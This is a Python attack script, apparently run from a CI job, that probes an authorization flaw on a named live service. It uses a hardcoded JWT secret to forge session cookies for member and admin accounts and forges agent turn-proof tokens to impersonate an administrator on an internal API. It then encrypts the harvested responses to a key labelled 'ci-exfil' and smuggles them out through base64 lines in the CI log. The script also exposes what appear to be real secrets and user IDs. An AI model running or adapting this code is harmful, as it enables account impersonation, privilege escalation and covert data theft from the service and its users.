#!/usr/bin/env python3
# probe58b (intent 28458, round 2): resolve the REAL severity boundary of turn-proof.
# Key question the source raised: in COMPAT mode (enforce=off) the no-credential body-actor
# path (resolveActor L130-158) does NOT apply privateRuntimeRule, and 普通成员 role has
# org.runtime.register_own (iam.ts L743). So can an ORDINARY MEMBER's own (private) runtime
# impersonate any same-org actor (incl. system_admin) on the agent-internal API?
# Also test whether an admin-created PRIVATE runtime bypasses owner restriction via body actor.
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, re, traceback
_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
HOST = "assistant.lumiiai.cn"; ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
SUB_ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
MEMBER = "usr_AeNhBtrhHSALrHRJg2z25"        # 普通成员 (from round1 iam/assignments)
MEMBER2 = "usr_8WTmpJ5gAdAXJdTAAgfcs"       # 普通成员
ADMIN2 = "usr_2gzZoKLgRAYaFNy2Sav4v"        # 另一个管理员
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
OUT = "/tmp/res_r58b"
for d in ("api", "rt"): os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a); print(s, flush=True); LOG.write(s + "\n"); LOG.flush()
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": ORG, "iat": now, "exp": now + 86400 * 7, "sid": "sid_" + uuid.uuid4().hex, "lgn": now}, separators=(',', ':')))
    return h + "." + p + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
def curl(args, timeout=60):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:300]
    except Exception as e:
        return -1, b"", repr(e)[:200]
def call(path, method="GET", body=None, hdrs=None, sub="", timeout=60, tag="", subdir="api", disk_cap=200000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json", "-H", "Referer: https://%s/" % HOST, "-H", "Origin: https://%s" % HOST, "-w", "\n__CODE__%{http_code}"]
    if sub: args += ["-b", "lumii_session=" + jwt(sub)]
    if hdrs:
        for k, v in hdrs.items(): args += ["-H", "%s: %s" % (k, v)]
    if body is not None: args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET": args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    fn = re.sub(r'[^A-Za-z0-9_.-]', '_', tag or path)[:70] + "_" + uuid.uuid4().hex[:6] + ".json"
    json.dump({"path": path, "method": method, "code": code, "body": txt[:disk_cap], "len": len(txt)}, open(os.path.join(OUT, subdir, fn), "w"), indent=1, ensure_ascii=False)
    log("[%s] %s %s -> %s len=%d" % (tag, method, path, code, len(txt)))
    return {"code": code, "body": txt, "len": len(txt)}
def create_runtime(sub, name, visibility=None, tag="create"):
    body = {"name": name}
    if visibility: body["visibility"] = visibility
    r = call("/api/runtimes", "POST", body, sub=sub, tag=tag, subdir="rt", disk_cap=3000)
    aid = ""; tok = ""; 
    try:
        j = json.loads(r["body"]); aid = j.get("agentId") or ""
        open(os.path.join(OUT, "rt", tag + "_script.sh"), "w").write((j.get("script") or "")[:400000])
        m = re.search(r'AGENT_TOKEN=["\']?([A-Za-z0-9_\-\.=+/]+)', j.get("script") or ""); tok = m.group(1) if m else ""
    except Exception: pass
    return r, aid, tok
def get_keys(aid, tok, tag="keys"):
    r = call("/api/runtimes/keys/current", hdrs={"x-agent-id": aid, "x-agent-token": tok}, tag=tag, subdir="rt")
    pk = ""; ls = ""; ver = 0
    try:
        j = json.loads(r["body"]); pk = j.get("proof_key") or ""; ls = j.get("legacy_secret") or ""; ver = int(j.get("proof_key_version") or 0)
    except Exception: pass
    return pk, ls, ver
def forge_v2(actor, sk, pk, aid):
    now = int(time.time())
    payload = {"session_key": sk, "platform": "dashboard", "chat_id": "conv_v58b" + uuid.uuid4().hex[:8], "actor_id": actor, "iss": aid, "aud": aid, "iat": now, "exp": now + 1800, "msg_id": "m" + uuid.uuid4().hex[:8]}
    p = b64u(json.dumps(payload, separators=(',', ':')).encode())
    return "v2." + p + "." + b64u(hmac.new(pk.encode(), p.encode(), hashlib.sha256).digest())
res = {"matrix": [], "notes": {}}
def allows(tag, actor, sk, proof, code, MH):
    body = {"platform": "dashboard", "actor_id": actor, "session_key": sk, "code": code}
    h = dict(MH)
    if proof: h["x-lumii-turn-proof"] = proof
    r = call("/internal/authz/allows", "POST", body, hdrs=h, tag=tag)
    res["matrix"].append({"tag": tag, "actor": actor, "proof": bool(proof), "http": r["code"], "body": r["body"][:200]})
    log("MATRIX", tag, "->", r["code"], r["body"][:120])
    return r

# ---- A: member session identity ----
log("=== A member session ===")
meM = call("/api/me", sub=MEMBER, tag="me_member"); 
meb = ""; 
try: meb = json.loads(meM["body"]).get("name")
except Exception: pass
log("member /api/me code=%s name=%s body=%s" % (meM["code"], meb, meM["body"][:200]))
# can member read iam assignments?
iam = call("/api/iam/assignments", sub=MEMBER, tag="iam_member"); log("member iam/assignments code=%s" % iam["code"])

# ---- B: member creates a runtime (register_own) ----
log("=== B member create runtime ===")
rM, m_aid, m_tok = create_runtime(MEMBER, "ci58b-m-" + uuid.uuid4().hex[:5], tag="create_member")
log("member create -> %s agentId=%s tok=%s" % (rM["code"], m_aid, m_tok[:10]))
res["notes"]["member_create_code"] = rM["code"]
res["notes"]["member_create_body"] = rM["body"][:400]
m_pk = ""; m_ls = ""; m_ver = 0
if m_aid and m_tok:
    m_pk, m_ls, m_ver = get_keys(m_aid, m_tok, tag="keys_member")
    log("member proof_key=%s ver=%s legacy==ce4bc6b0? %s" % (m_pk[:12], m_ver, m_ls == "ce4bc6b0c0ab05a849adf046d57dbf11a98386d7e6804315"))
    MHm = {"Authorization": "Bearer " + m_tok, "x-agent-id": m_aid}
    SK = "sk_v58b_" + uuid.uuid4().hex[:8]
    # **the decisive test**: member-owned runtime, NO proof, body actor=ADMIN
    allows("MB_body_ADMIN", SUB_ADMIN, SK, None, "drive.manage_all", MHm)
    allows("MB_body_ADMIN_asst", SUB_ADMIN, SK, None, "assistant.manage_all", MHm)
    allows("MB_body_MEMBER2", MEMBER2, SK, None, "drive.manage_all", MHm)
    allows("MB_body_BOGUS", "usr_"+"0"*24, SK, None, "drive.manage_all", MHm)
    # and via forged v2 (privateRuntimeRule should reject non-owner actor, so this tests rule)
    if m_pk:
        allows("MB_v2_ADMIN_private", SUB_ADMIN, SK, forge_v2(SUB_ADMIN, SK, m_pk, m_aid), "drive.manage_all", MHm)

# ---- C: admin creates a PRIVATE runtime, test body-actor impersonation ----
log("=== C admin private runtime ===")
rP, p_aid, p_tok = create_runtime(SUB_ADMIN, "ci58b-p-" + uuid.uuid4().hex[:5], visibility="private", tag="create_adminpriv")
log("admin private create -> %s agentId=%s" % (rP["code"], p_aid))
res["notes"]["adminpriv_create_code"] = rP["code"]
if p_aid and p_tok:
    p_pk, p_ls, p_ver = get_keys(p_aid, p_tok, tag="keys_adminpriv")
    MHp = {"Authorization": "Bearer " + p_tok, "x-agent-id": p_aid}
    SK2 = "sk_v58b2_" + uuid.uuid4().hex[:8]
    allows("PB_body_MEMBER2", MEMBER2, SK2, None, "drive.manage_all", MHp)   # private(admin-owned) claiming OTHER user via body
    allows("PB_body_ADMIN", SUB_ADMIN, SK2, None, "drive.manage_all", MHp)

json.dump(res, open(os.path.join(OUT, "SUMMARY.json"), "w"), indent=1, ensure_ascii=False)
try:
    import tarfile
    G = "/tmp/gnupg58b"; os.makedirs(G, exist_ok=True); os.chmod(G, 0o700); os.environ["GNUPGHOME"] = G
    subprocess.run(["gpg", "--batch", "--import", os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")], capture_output=True, timeout=60)
    tb = "/tmp/res_r58b.tar.gz"
    with tarfile.open(tb, "w:gz") as t: t.add(OUT, arcname="res_r58b")
    enc = tb + ".gpg"
    subprocess.run(["gpg", "--batch", "--yes", "--trust-model", "always", "-r", "ci-exfil@example.invalid", "-o", enc, "-e", tb], capture_output=True, timeout=120)
    blob = base64.b64encode(open(enc, "rb").read()).decode()
    log("===B64BEGIN %d===" % len(blob))
    for i in range(0, len(blob), 400): print("B64:" + blob[i:i+400], flush=True)
    log("===B64END===")
except Exception:
    log("pack err", traceback.format_exc()[:500])
